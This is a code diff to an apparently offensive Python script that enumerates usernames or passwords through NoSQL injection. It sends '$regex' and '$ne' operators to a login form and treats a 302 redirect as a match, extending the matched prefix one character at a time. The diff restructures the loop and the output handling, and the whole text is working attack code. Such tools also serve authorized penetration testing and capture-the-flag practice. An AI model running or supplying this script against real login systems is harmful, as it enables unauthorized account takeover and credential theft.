@@ -42,7 +42,7 @@ def main():
     characters = ''.join(c for c in string.printable if c not in "$^&*|.+\?")
 
     loop = True
-    final_output = ""
+    final_output = []
     count = 0
 
     payloads = build_payloads(characters)
@@ -51,34 +51,32 @@ def main():
         para = {enum_parameter + '[$regex]': "^" + payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
         r = method(url, data=para, allow_redirects=False)
 
-        if r.status_code != 302:
-            print(Fore.MAGENTA + f"No pattern starts with '{payload[0]}'")
-            continue
+        if r.status_code == 302:
+            loop = True
+            print(Fore.GREEN + f"Pattern found that starts with '{payload[0]}'")
+            userpass = payload
+            while loop:
+                loop = False
+                for char in characters:
+                    new_payload = userpass + char
+                    para = {enum_parameter + '[$regex]': "^" + new_payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
+                    r = method(url, data=para)
 
-        loop = True
-        print(Fore.GREEN + f"Pattern found that starts with '{payload[0]}'")
-        userpass = payload
-        while loop:
-            loop = False
-            for char in characters:
-                new_payload = userpass + char
-                para = {enum_parameter + '[$regex]': "^" + new_payload + ".*", password_parameter + '[$ne]': '1' + other_parameters}
-                r = method(url, data=para)
+                    if r.status_code == 302:
+                        print(Fore.YELLOW + f"Pattern found: {new_payload}")
+                        userpass = new_payload
+                        loop = True
 
-                if r.status_code == 302:
-                    print(Fore.YELLOW + f"Pattern found: {new_payload}")
-                    userpass = new_payload
-                    loop = True
+            print(Fore.GREEN + f"{enum_parameter} found: {userpass}")
+            final_output.append(userpass)
+            count += 1
 
-        print(Fore.GREEN + f"{enum_parameter} found: {userpass}")
-        final_output += userpass + "\n"
-        count += 1
-
-    if final_output:
-        print(f"\n{count} {enum_parameter}(s) found:")
-        print(Fore.RED + final_output)
-    else:
+    if count == 0:
         print(Fore.RED + f"No {enum_parameter} found")
+    else:
+        print(f"\n{count} {enum_parameter}(s) found:")
+        print(Fore.RED + "\n".join(final_output))
 
 if __name__ == "__main__":
     main()
+
